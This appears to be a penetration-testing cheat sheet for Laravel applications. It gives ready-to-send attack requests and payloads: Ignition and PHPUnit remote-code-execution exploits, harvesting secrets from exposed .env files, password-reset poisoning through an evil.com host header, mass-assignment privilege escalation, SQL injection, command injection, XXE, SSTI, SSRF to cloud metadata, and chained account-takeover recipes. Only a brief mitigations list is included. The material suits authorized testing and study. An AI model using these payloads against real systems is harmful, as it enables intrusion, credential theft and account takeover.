## 1. Overview

Laravel is a popular PHP web framework. When testing Laravel apps, you're looking for framework-specific weaknesses, misconfigurations, and exposed sensitive files. Key indicators include the `laravel_session` cookie and specific file/directory structures.

**Quick Detection:**

- Look for `Set-Cookie: laravel_session=` in HTTP responses
- Check for `composer.json` exposure at root
- Test `_ignition/health-check` endpoint (Laravel ≥6.x with Ignition debug tool)

---

## 2. Exploitation Methods

### 🔍 **Step 1: Fingerprint Laravel Version**

**Check composer.json:**

```
https://target.com/composer.json
```

- Look for `laravel/framework` version number
- Cross-reference with [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-16542/product_id-38139/Laravel-Laravel.html)

**Check Ignition endpoint:**

```
GET /_ignition/health-check HTTP/1.1
Host: target.com
```

- Search response for `can_execute_commands: true`
- Indicates RCE potential via CVE-2021-3129

---

### 🚨 **Step 2: Test for Critical CVEs**

#### **CVE-2021-3129 - Ignition RCE (Laravel 8.x)**

**Conditions:** Debug mode enabled + Ignition installed

**Exploit:**

```http
POST /_ignition/execute-solution HTTP/1.1
Host: target.com
Accept: application/json
Content-Type: application/json

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "rce_test",
    "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
  }
}
```

#### **CVE-2017-9841 - PHPUnit RCE (Laravel 4.8.28 ~ 5.x)**

**Test endpoint:**

```bash
curl -d "<?php echo php_uname(); ?>" https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

---

### 📂 **Step 3: Hunt for Exposed Sensitive Files**

**Test these paths:**

```
/.env
/storage/logs/laravel.log
/composer.json
/composer.lock
/.git/config
/webpack.mix.js
```

**What to look for in .env:**

- `APP_KEY` (encryption key)
- `DB_PASSWORD` (database credentials)
- `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`
- `MAIL_PASSWORD`
- API tokens for third-party services

---

### 🐛 **Step 4: Trigger Debug Mode Disclosure**

**Method 1: Invalid HTTP Verb**

```http
POST /some-page HTTP/1.1
Host: target.com
```

- If page expects GET, you'll see 405 error with full stack trace

**Method 2: Array Parameter Injection**

```
https://target.com/search?query[]=malicious
https://target.com/validateEmail?email[]=
```

- Causes type errors that leak paths, environment details

---

### 🔓 **Step 5: CSRF Token Bypass via XSS/CRLF**

Laravel uses CSRF tokens stored in cookies. If you find XSS on `*.domain.tld`, you can:

1. Inject JavaScript to read CSRF token from `XSRF-TOKEN` cookie
2. Use CRLF injection to overwrite the token
3. Chain with state-changing actions

---

### 🎯 **Step 6: Mass Assignment / Parameter Pollution**

Laravel models use `$fillable` or `$guarded` properties. Test for:

**Privilege escalation:**

```http
POST /api/users/update HTTP/1.1

{
  "name": "attacker",
  "role": "admin",
  "is_admin": true
}
```

**Price manipulation:**

```http
POST /checkout HTTP/1.1

{
  "product_id": 123,
  "price": 0.01,
  "discount": 9999
}
```

---

### 📧 **Step 7: Host Header Injection (Laravel ≤8.x)**

**Password reset poisoning:**

```http
POST /password/email HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@target.com
```

The reset link will point to `https://evil.com/reset?token=...`

---

### 🔎 **Step 8: IDOR & Logic Flaws**

Laravel uses Eloquent ORM. Common patterns:

**Direct ID reference:**

```
GET /api/orders/1337
GET /api/users/profile/42
```

**UUID predictability:**

- Check if UUIDs are sequential or use weak randomness
- Test timestamp-based UUIDs (version 1)

---

## 3. Bypasses

### **CSRF Protection Bypass**

**Referer header check bypass:**

```http
POST /api/action HTTP/1.1
Host: target.com
Referer: https://target.com.attacker.com
```

**Empty token accepted:**

```http
POST /api/action HTTP/1.1

_token=
```

### **Authentication Bypass**

**JWT weak secret (if APP_KEY is exposed):**

- Decode JWT from `laravel_token` cookie
- Re-sign with leaked `APP_KEY` from `.env`

---

## 4. Key Payloads

### **XSS in Blade Templates**

```php
{{ $user_input }}  <!-- Escaped by default -->
{!! $user_input !!}  <!-- Raw output - XSS -->
```

### **SQL Injection in Raw Queries**

```php
// Vulnerable
DB::select("SELECT * FROM users WHERE id = " . $id);

// Test payload
1 UNION SELECT 1,2,3,password,5 FROM users--
```

### **Path Traversal in File Operations**

```
GET /download?file=../../../../etc/passwd
GET /export?template=../../.env
```

### **Command Injection via Process**

```php
// If user input reaches shell_exec, exec, system
; cat /etc/passwd
| whoami
`id`
```

### **Deserialization (if unserialize() used on user input)**

```php
O:8:"stdClass":1:{s:4:"data";s:10:"phpinfo();";}
```

### **SSTI (Server-Side Template Injection)**

```
{{7*7}}  // Test
{{system('id')}}
```

### **XXE in XML Parsing**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### **SSRF via HTTP Client**

```
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
```

---

## 5. Higher Impact Scenarios

### **🔥 Chain #1: .env Exposure → Full Account Takeover**

1. Download `/.env`
2. Extract `APP_KEY`
3. Forge session cookie with admin privileges
4. Access admin panel

### **🔥 Chain #2: Debug Mode → RCE**

1. Trigger error with array injection
2. Leak application path from stack trace
3. Use path in CVE-2021-3129 payload
4. Execute arbitrary PHP code

### **🔥 Chain #3: Host Header Injection → Admin Account Takeover**

1. Request password reset for admin with `X-Forwarded-Host: evil.com`
2. Admin receives link pointing to your domain
3. Capture reset token from logs
4. Reset admin password

### **🔥 Chain #4: Mass Assignment → Privilege Escalation**

1. Find user update endpoint
2. Test for unprotected `role` or `is_admin` fields
3. Elevate privileges via parameter pollution
4. Access restricted resources

### **🔥 Chain #5: IDOR + Log File Access**

1. Find IDOR in file download
2. Access `/storage/logs/laravel.log`
3. Extract sensitive data (API keys, queries with passwords)

---

## 6. Mitigations

**For Defenders:**

- ❌ Disable debug mode in production (`APP_DEBUG=false`)
- 🔒 Move `.env` outside webroot or block via `.htaccess`
- 🛡️ Keep Laravel + dependencies updated
- 🚫 Remove PHPUnit from production
- 🔐 Use `$fillable` (whitelist) over `$guarded` (blacklist)
- ✅ Validate all user input with Laravel's validation rules
- 🎯 Implement proper authorization checks (policies/gates)
- 📝 Sanitize logs to prevent sensitive data leakage
- 🌐 Validate host headers and disable `X-Forwarded-Host` if not needed

---

## Quick Testing Checklist

```
☐ Check composer.json for version
☐ Test /.env exposure
☐ Test /storage/logs/laravel.log
☐ Try CVE-2021-3129 if Ignition detected
☐ Try CVE-2017-9841 PHPUnit RCE
☐ Trigger debug mode with invalid verbs
☐ Test array parameter injection
☐ Fuzz for common Laravel paths
☐ Test mass assignment on update endpoints
☐ Test IDOR on all ID-based endpoints
☐ Check for host header injection on auth flows
☐ Test CSRF bypass techniques
☐ Run automated scanner (Burp/Acunetix)
```

---

**🎯 Pro Tip:** Laravel apps often have traditional web server setups. Use directory fuzzing with Laravel-specific wordlists. Focus on `/storage/`, `/vendor/`, `/bootstrap/cache/` paths.